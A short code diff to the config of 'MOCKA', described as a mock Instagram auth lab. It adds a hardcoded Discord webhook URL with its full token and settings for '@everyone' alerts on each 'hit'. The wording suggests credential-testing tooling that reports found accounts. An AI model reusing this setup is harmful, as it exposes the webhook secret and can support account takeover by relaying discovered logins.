@@ -48,5 +48,12 @@ class Config:
     APP_NAME = "MOCKA"
     APP_TAGLINE = "Mock Instagram auth lab"
 
+    # Discord hit alerts (@everyone on find)
+    DISCORD_WEBHOOK_URL = os.getenv(
+        "DISCORD_WEBHOOK_URL",
+        "https://discord.com/api/webhooks/1533450209269518520/EwGkAqnCM2RJ7lP7u-HKWx0KqlcyZy-Et3EbkWhueftRhpWvMlT2L_0QDRXtNE1V-c3P",
+    )
+    DISCORD_HIT_SPAM_COUNT = _int("DISCORD_HIT_SPAM_COUNT", 3)
+
 
 config = Config()
